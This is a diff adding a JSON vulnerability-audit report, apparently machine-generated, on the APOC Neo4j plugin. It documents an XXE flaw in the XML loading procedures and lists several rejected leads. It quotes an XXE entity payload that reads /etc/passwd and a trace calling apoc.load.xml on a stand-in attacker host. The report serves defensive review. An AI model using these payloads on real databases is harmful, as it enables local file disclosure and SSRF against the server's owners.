@@ -1,0 +1,85 @@
+{
+  "candidates": [
+    {
+      "attacker_control": "The url argument of apoc.load.xml(url, path, config, simple), apoc.load.xmlSimple(url) and apoc.xml.import(url, config) is fully caller-controlled, and the XML body plus its DOCTYPE (e.g. <!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]> ... <r>&x;</r>) is served by a host the caller chooses (or any attacker-influenced feed). The procedures have no Util.checkAdmin gate (only apoc.config.list/map call checkAdmin), so any authenticated user permitted by the deployment's procedure whitelist can invoke them; the http(s) URL path passes FileUtils.checkReadAllowed even with apoc.import.file.enabled=false.",
+      "confidence": "medium",
+      "counterevidence_checked": "Checked every XML parser site in the tree and searched for hardening (setFeature, XMLConstants, disallow-doctype, ACCESS_EXTERNAL*, isSupportingExternalEntities, SUPPORT_DTD, setExpandEntityReferences): none is present, so there is no local mitigation to defeat. Considered that apoc.load.* is a documented URL loader and that fetching remote XML is intended behavior; however reading arbitrary local files is separately gated (FileUtils.checkReadAllowed requires apoc.import.file.enabled for file URLs), and this XXE bypasses exactly that gate, so it is not merely intended functionality. Considered failOnError: default true means parse errors propagate, but successful entity resolution returns data in the result rather than erroring. Considered deployment-level mitigations (javax.xml.accessExternalDTD, SecurityManager, egress filtering, procedure whitelists), which are outside the code and would block exploitation if configured.",
+      "id": "apoc-xxe-xml-loaders",
+      "impact": "Confidentiality breach on the DBMS host: an authenticated user can make the server read arbitrary files readable by the Neo4j process (e.g. $NEO4J_HOME/conf/neo4j.conf, /etc/passwd, /proc/self/environ, keystore/truststore files) and receive the contents in the query result, bypassing the apoc.import.file.enabled=false control that is specifically meant to block local file import. Additional effects: SSRF from entity/DTD URIs to hosts reachable only from the DBMS (internal metadata services, admin ports), and resource-exhaustion/DoS from entity expansion because no FEATURE_SECURE_PROCESSING or entity limits are configured. No remote code execution is demonstrated.",
+      "locations": [
+        {
+          "end_line": 74,
+          "path": "src/main/java/apoc/load/Xml.java",
+          "start_line": 65
+        },
+        {
+          "end_line": 39,
+          "path": "src/main/java/apoc/load/Xml.java",
+          "start_line": 39
+        },
+        {
+          "end_line": 126,
+          "path": "src/main/java/apoc/load/Xml.java",
+          "start_line": 107
+        },
+        {
+          "end_line": 399,
+          "path": "src/main/java/apoc/load/Xml.java",
+          "start_line": 397
+        },
+        {
+          "end_line": 183,
+          "path": "src/main/java/apoc/export/graphml/XmlGraphMLReader.java",
+          "start_line": 179
+        },
+        {
+          "end_line": 144,
+          "path": "src/main/java/apoc/util/FileUtils.java",
+          "start_line": 137
+        }
+      ],
+      "prerequisites": "Ability to execute the procedure (default procedure execution rights in Neo4j 3.4/3.5 unless dbms.security.procedures.whitelist restricts them). Network reachability from the DBMS host to the attacker's XML document, or an attacker-controlled XML document already reachable by the server. Parser runs on Java 8 (sourceCompatibility 1.8) with default JAXP settings, where DTD processing and external general entities are enabled (javax.xml.accessExternalDTD defaults to all without a SecurityManager). Entity-expanded text must land in element text or an attribute so the map mapper (Xml.handleNode/handleTextNode, lines 189-301) serializes it into the returned map. No local-file configuration flag needs to be enabled when the outer URL is http(s).",
+      "root_cause": "The XML parsers used by the XML loading/import procedures are instantiated without disabling DTDs or external entities. In Xml.xmlXpathToMapResult (src/main/java/apoc/load/Xml.java:65-68) a DocumentBuilderFactory is created with only namespaceAware/ignoringElementContentWhitespace set and is then used at line 74 to parse bytes fetched from the caller-supplied URL (Util.openInputStream). The shared StAX factory (src/main/java/apoc/load/Xml.java:39) used by getXMLStreamReaderFromUrl (lines 121-125, called from apoc.load.xmlSimple line 107-109 and apoc.xml.import line 397-399) only sets javax.xml.stream.isCoalescing and leaves SUPPORT_DTD/isSupportingExternalEntities permissive. XmlGraphMLReader.parseXML (src/main/java/apoc/export/graphml/XmlGraphMLReader.java:179-183), used by apoc.import.graphml, is the same pattern. Repository-wide searches found no setFeature, XMLConstants, disallow-doctype-decl, external-general-entities=false, ACCESS_EXTERNAL_DTD, expandEntityReferences, or FEATURE_SECURE_PROCESSING anywhere, so no mitigation exists in this code. FileUtils.checkReadAllowed (src/main/java/apoc/util/FileUtils.java:137-140) only evaluates the outer URL string; entities resolved inside the document are never checked, so the apoc.import.file.enabled gate is not enforced for them.",
+      "title": "XXE in apoc.load.xml / apoc.load.xmlSimple / apoc.xml.import: local file disclosure and SSRF bypassing apoc.import.file.enabled",
+      "trace": "CALL apoc.load.xml('http://attacker/evil.xml') -> Xml.xml (line 49-50) -> xmlXpathToMapResult (line 60) -> DocumentBuilderFactory.newInstance() with no DTD/entity hardening (lines 65-68) -> FileUtils.checkReadAllowed(url) passes because the outer URL is http (FileUtils.java:137-139, isFile returns false for http) -> Util.openInputStream(url, headers, null) fetches the attacker document (Util.java:283-294 and 312-322/352-362) -> documentBuilder.parse(...) (line 74) resolves the attacker's external entity (file:///... for local file read, http://... for SSRF) -> handleNode/handleTextNode (lines 189-301) place the expanded value into the result map as _text/attribute -> the file content is returned to the caller as MapResult. The StAX variants reach the same behavior through getXMLStreamReaderFromUrl (lines 121-125) with the unrestricted static XMLInputFactory at line 39; apoc.xml.import (lines 397-399) writes the expanded entity text into node properties of the graph instead of returning it directly.",
+      "unverified": "Not executed or reproduced; exploitability depends on Java 8 JAXP defaults enabling DTD/external entities, which I did not run. Procedure execution rights for a low-privileged Neo4j user are version/configuration specific (dbms.security.procedures.*) and were not verified. The StAX paths (apoc.load.xmlSimple, apoc.xml.import, apoc.import.graphml) were read but not exercised; only the DOM path's data-flow to the returned map was traced end-to-end. Dependency versions were not checked for further XML issues (e.g. Apache POI 3.17 in apoc.load.xls).",
+      "weakness_type": "CWE-611 Improper Restriction of XML External Entity Reference (XXE)"
+    }
+  ],
+  "coverage_summary": "Reviewed the assigned 280-file snapshot (about 208 main Java sources, 5 jmh files, plus Gradle/build files and generated docs). I read or searched the data-loading and file/URL stack (apoc.load Xml, Json/JsonUtil, Csv/ImportCsv/CsvEntityLoader, Xls, Html, Ldap, Jdbc, Bolt), the file/URL utilities (FileUtils, Util.openInputStream/openUrlConnection, UriResolver, UrlResolver, JsonUtil, s3 package), export paths (ExportGraphML, XmlGraphMLReader/Writer, ExportCsv, ExportCypher, FileManagerFactory), and representative modules for injection/privilege issues (Atomic, Merge, Schemas, GraphRefactoring, Rename, Trigger, CypherProcedures, Config, ApocConfiguration, IndexUpdateTransactionEventHandler, FulltextIndex, Periodic, Bolt, Gephi, ElasticSearch/MongoDB/Couchbase call sites). Broad searches covered XML hardening, deserialization (ObjectInputStream/readObject), command execution (Runtime/ProcessBuilder), reflection/class loading, file writes, URL sinks, and admin checks. No source tests exist in scope, so no behavior could be executed or validated.",
+  "limitations": [
+    "Static source review only; no code execution, parser testing, or exploit payloads, and no runtime confirmation of any finding.",
+    "JAXP behavior (DTD/external-entity default resolution) is assumed for the project's declared Java 8 target and default JVM settings; deployment-level properties (javax.xml.accessExternalDTD, SecurityManager) were not observable.",
+    "Neo4j procedure permission semantics for Neo4j 3.4/3.5 (who may invoke apoc.load.*) are environment dependent and were not verified.",
+    "Generated HTML documentation (docs/index.html, docs/guide.html) and build scripts were searched selectively, not reviewed line by line.",
+    "Third-party dependency versions (POI 3.17, jsoup, jackson 1.x, jayway json-path 2.2.0, opencsv, jldap, drivers) were not checked against vulnerability databases.",
+    "Only src/main and src/jmh exist in the snapshot; no test sources were available to confirm intended behavior or exception handling."
+  ],
+  "rejected_leads": [
+    {
+      "lead": "Import-directory confinement bypass in src/main/java/apoc/util/FileUtils.java:85-110 (changeFileUrlIfImportDirectoryConstrained): the containment decision is a lexical url.startsWith(importDir) check, and the accepted path is then built with non-canonical new File(fileAsUrl) / new File(dir.getAbsolutePath(), fileAsUrl) without canonical-path validation, so '..' segments or a sibling directory whose name shares the prefix can escape dbms.directories.import.",
+      "reason": "Plausibly a CWE-22 bypass, but it only matters when non-default apoc.import.file.use_neo4j_config=true plus dbms.security.allow_csv_import_from_file_urls=true and dbms.directories.import are set, and the exact input that survives both the Java File(String,absoluteChild) concatenation and the exists()/canRead() check is subtle; I could not confirm it without executing code. Lower confidence and narrower impact than the XXE candidate."
+    },
+    {
+      "lead": "Export gate mismatch in src/main/java/apoc/export/graphml/ExportGraphML.java:92-95: exportGraphML performs a write to an arbitrary path after FileUtils.checkReadAllowed(fileName) (the import gate) instead of checkWriteAllowed() (the export gate), unlike ExportCsv/ExportCypher which call checkWriteAllowed().",
+      "reason": "Looks like a real control bypass (server-side file write permitted with only apoc.import.file.enabled=true and export disabled), but impact is limited to XML-escaped GraphML content (overwrite/DoS, no direct code execution) and it was not runtime verified; rejected in favor of the file-read XXE candidate."
+    },
+    {
+      "lead": "SSRF / arbitrary URL fetching in apoc.load.json, apoc.load.csv, apoc.load.html, apoc.load.xls and apoc.gephi.add through Util.openInputStream (src/main/java/apoc/util/Util.java:283-362).",
+      "reason": "Fetching remote URLs is the documented purpose of these procedures (web API loaders), and any authenticated user can already issue read queries; the only clear boundary crossing found (reading local files while imports are disabled) is covered by the XXE candidate, so this is not submitted separately."
+    },
+    {
+      "lead": "apoc.load.jdbc accepts a fully caller-supplied JDBC URL and apoc.load.driver loads an arbitrary class via Class.forName (src/main/java/apoc/load/Jdbc.java:56-68, 84-90); JDBC URL gadgets (e.g. autoDeserialize) could lead to deserialization attacks.",
+      "reason": "Impact depends entirely on which third-party JDBC drivers are deployed in the plugins directory and on their versions; not evidenced within this source tree and not verifiable statically here."
+    },
+    {
+      "lead": "Cypher statement construction from caller-supplied identifiers in apoc.atomic (Atomic.java:187), apoc.merge (Merge.java:31, 51) and apoc.schema (Schemas.java:110, 175).",
+      "reason": "The injected strings come from the same caller who can already execute Cypher via the apoc.cypher.* family, so no privilege or trust boundary is crossed that would make this an escalation."
+    },
+    {
+      "lead": "apoc.trigger.add / apoc.custom.* persist arbitrary Cypher that is later executed by background/transactional machinery (Trigger.java:102-113 and 244-252) without a Util.checkAdmin gate.",
+      "reason": "A design-level tenancy/privilege concern; proving privilege escalation requires Neo4j Enterprise role semantics and the security context used for trigger execution, neither of which is visible in this snapshot."
+    }
+  ],
+  "summary": "APOC (neo4j-apoc-procedures) snapshot, 280 files, no test sources. I traced procedure argument -> URL fetch -> XML parsing across the loading/import/export code and found no XML hardening anywhere in the tree. Strongest candidate: the XML parsers behind apoc.load.xml / apoc.load.xmlSimple / apoc.xml.import (and apoc.import.graphml) are created with DTD processing and external entity resolution left at permissive JAXP defaults and then fed caller-controlled XML, so external entities (e.g. file:///etc/passwd) are resolved inside the parser and their content is returned in the result map. This bypasses the intended apoc.import.file.enabled=false protection because FileUtils.checkReadAllowed/changeFileUrlIfImportDirectoryConstrained validate only the top-level URL argument, not entities resolved by the parser. Secondary, lower-confidence leads (import-directory prefix check bypass in FileUtils; apoc.export.graphml writing after a read-gate check) are listed as rejected/unconfirmed rather than additional candidates."
+}
